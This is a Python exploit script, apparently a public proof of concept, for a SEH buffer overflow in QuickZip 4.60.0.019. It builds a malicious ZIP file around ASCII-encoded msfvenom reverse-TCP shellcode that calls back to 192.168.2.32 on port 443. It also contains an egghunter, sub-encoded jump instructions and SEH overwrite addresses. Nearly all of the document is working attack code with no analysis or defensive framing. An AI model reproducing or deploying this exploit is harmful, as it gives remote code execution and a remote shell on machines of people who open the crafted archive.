#/usr/bin/python
#Written By: Eric Van Zutphen
#Purpose: Quickzip 4.60.0.019  SEH Overflow


header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")

header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")

"""
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.32 LPORT=443 -f python EXITFUNC=thread -v shellcode -b "\x00\x0a\x0d\x2f\x3a\x5c" -e x86/alpha_upper -a x86 --platform windows
Payload Size: 717
"""

shellcode =  ""
shellcode += "\x89\xe7\xda\xcf\xd9\x77\xf4\x5b\x53\x59\x49\x49"
shellcode += "\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54"
shellcode += "\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48"
shellcode += "\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41"
shellcode += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
shellcode += "\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4b\x58\x4b"
shellcode += "\x32\x53\x30\x33\x30\x55\x50\x33\x50\x4c\x49\x4d"
shellcode += "\x35\x50\x31\x39\x50\x43\x54\x4c\x4b\x36\x30\x36"
shellcode += "\x50\x4c\x4b\x50\x52\x54\x4c\x4c\x4b\x56\x32\x32"
shellcode += "\x34\x4c\x4b\x32\x52\x47\x58\x54\x4f\x4e\x57\x50"
shellcode += "\x4a\x57\x56\x46\x51\x4b\x4f\x4e\x4c\x37\x4c\x55"
shellcode += "\x31\x43\x4c\x34\x42\x56\x4c\x47\x50\x59\x51\x48"
shellcode += "\x4f\x44\x4d\x55\x51\x39\x57\x4a\x42\x5a\x52\x30"
shellcode += "\x52\x56\x37\x4c\x4b\x46\x32\x42\x30\x4c\x4b\x30"
shellcode += "\x4a\x47\x4c\x4c\x4b\x50\x4c\x42\x31\x53\x48\x4a"
shellcode += "\x43\x50\x48\x43\x31\x4e\x31\x30\x51\x4c\x4b\x31"
shellcode += "\x49\x51\x30\x35\x51\x48\x53\x4c\x4b\x47\x39\x55"
shellcode += "\x48\x4a\x43\x46\x5a\x30\x49\x4c\x4b\x56\x54\x4c"
shellcode += "\x4b\x43\x31\x38\x56\x46\x51\x4b\x4f\x4e\x4c\x49"
shellcode += "\x51\x38\x4f\x34\x4d\x35\x51\x38\x47\x36\x58\x4b"
shellcode += "\x50\x44\x35\x4a\x56\x35\x53\x33\x4d\x4a\x58\x37"
shellcode += "\x4b\x33\x4d\x46\x44\x52\x55\x4d\x34\x50\x58\x4c"
shellcode += "\x4b\x51\x48\x36\x44\x53\x31\x4e\x33\x52\x46\x4c"
shellcode += "\x4b\x34\x4c\x30\x4b\x4c\x4b\x31\x48\x55\x4c\x43"
shellcode += "\x31\x49\x43\x4c\x4b\x33\x34\x4c\x4b\x53\x31\x4e"
shellcode += "\x30\x4c\x49\x30\x44\x46\x44\x36\x44\x31\x4b\x31"
shellcode += "\x4b\x45\x31\x30\x59\x51\x4a\x36\x31\x4b\x4f\x4b"
shellcode += "\x50\x51\x4f\x31\x4f\x31\x4a\x4c\x4b\x52\x32\x4a"
shellcode += "\x4b\x4c\x4d\x31\x4d\x32\x48\x36\x53\x46\x52\x35"
shellcode += "\x50\x55\x50\x52\x48\x52\x57\x53\x43\x46\x52\x31"
shellcode += "\x4f\x56\x34\x33\x58\x50\x4c\x54\x37\x46\x46\x45"
shellcode += "\x57\x4b\x4f\x38\x55\x38\x38\x5a\x30\x33\x31\x53"
shellcode += "\x30\x43\x30\x57\x59\x4f\x34\x31\x44\x30\x50\x32"
shellcode += "\x48\x57\x59\x4b\x30\x42\x4b\x53\x30\x4b\x4f\x59"
shellcode += "\x45\x46\x30\x46\x30\x56\x30\x46\x30\x57\x30\x46"
shellcode += "\x30\x57\x30\x36\x30\x33\x58\x4b\x5a\x54\x4f\x59"
shellcode += "\x4f\x4d\x30\x4b\x4f\x39\x45\x5a\x37\x33\x5a\x44"
shellcode += "\x45\x35\x38\x4f\x30\x49\x38\x43\x32\x31\x30\x52"
shellcode += "\x48\x34\x42\x55\x50\x43\x31\x4f\x4b\x4d\x59\x4d"
shellcode += "\x36\x33\x5a\x34\x50\x36\x36\x31\x47\x45\x38\x4c"
shellcode += "\x59\x49\x35\x43\x44\x45\x31\x4b\x4f\x39\x45\x4b"
shellcode += "\x35\x4f\x30\x33\x44\x44\x4c\x4b\x4f\x50\x4e\x45"
shellcode += "\x58\x43\x45\x4a\x4c\x55\x38\x4c\x30\x4e\x55\x49"
shellcode += "\x32\x50\x56\x4b\x4f\x39\x45\x45\x38\x33\x53\x52"
shellcode += "\x4d\x42\x44\x35\x50\x4d\x59\x4b\x53\x51\x47\x50"
shellcode += "\x57\x56\x37\x46\x51\x4c\x36\x52\x4a\x44\x52\x30"
shellcode += "\x59\x46\x36\x4a\x42\x4b\x4d\x33\x56\x4f\x37\x47"
shellcode += "\x34\x56\x44\x47\x4c\x45\x51\x55\x51\x4c\x4d\x31"
shellcode += "\x54\x47\x54\x32\x30\x59\x56\x33\x30\x50\x44\x51"
shellcode += "\x44\x50\x50\x46\x36\x36\x36\x46\x36\x30\x46\x31"
shellcode += "\x46\x30\x4e\x56\x36\x31\x46\x46\x33\x36\x36\x45"
shellcode += "\x38\x42\x59\x48\x4c\x37\x4f\x4b\x36\x4b\x4f\x39"
shellcode += "\x45\x4b\x39\x4d\x30\x30\x4e\x36\x36\x37\x36\x4b"
shellcode += "\x4f\x30\x30\x33\x58\x54\x48\x4b\x37\x35\x4d\x43"
shellcode += "\x50\x4b\x4f\x38\x55\x4f\x4b\x4d\x30\x35\x4d\x47"
shellcode += "\x5a\x35\x5a\x43\x58\x39\x36\x5a\x35\x4f\x4d\x4d"
shellcode += "\x4d\x4b\x4f\x39\x45\x37\x4c\x43\x36\x33\x4c\x34"
shellcode += "\x4a\x4b\x30\x4b\x4b\x4b\x50\x54\x35\x55\x55\x4f"
shellcode += "\x4b\x50\x47\x54\x53\x34\x32\x32\x4f\x52\x4a\x55"
shellcode += "\x50\x51\x43\x4b\x4f\x58\x55\x41\x41"

#egghunter ascii uppercase ebx as base register
egg = 'T00WT00W'
egghunter = 'SYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJI56MQHJKO4O0B0RRJERPX8MVN7LDEPZ44ZONXPTFPVPQGLKKJNO2UJJNOBUKWKOKWA'

subencode = "\x61\x61\x5c" #popad, push ebx, pop esp
subencode += "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A" # zero out eax
subencode += "\x2D\x20\x20\x20\x20\x2D\x62\x62\x63\x7E\x2D\x7E\x7D\x7D\x7D" # jmp ebx
subencode += "\x50" # push eax
subencode += "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A" # zero eax
subencode += "\x2D\x20\x41\x20\x20\x2D\x21\x7D\x20\x5D\x2D\x3E\x7E\x78\x7E" # add ebx, 0x446
subencode += "\x50" # push eax




#Log data, item 22
#Address=00437E18
#Message=  0x00437e18 : pop ecx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [QuickZip.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\QuickZip4\QuickZip.exe)

nseh = '\x73\xf1\xff\xff' #jmp if ZF = 1 0xf1 get converted to 0xb1 jmp back 77 bytes
seh = '\x18\x7e\x43\x00'
nops = 'A' * 10

payload = nops + egghunter + 'A' *(296 - len(egghunter) - len(subencode) - len(nops)*2) + subencode + nops + nseh + seh + nops + egg +  shellcode + 'D' * (3760 - len(shellcode) - len(nops) - len(egg))
payload += ".txt"

print "[+] Building Exploit [+]"
print "[+] Length = " + str(len(payload)) + "  [+]"


exploit = header_1 + payload + header_2 + payload + header_3

exploit_file = open('quick-exploit.zip','w')
exploit_file.write(exploit)
exploit_file.close()

print "[+] Exploit Created [+]"
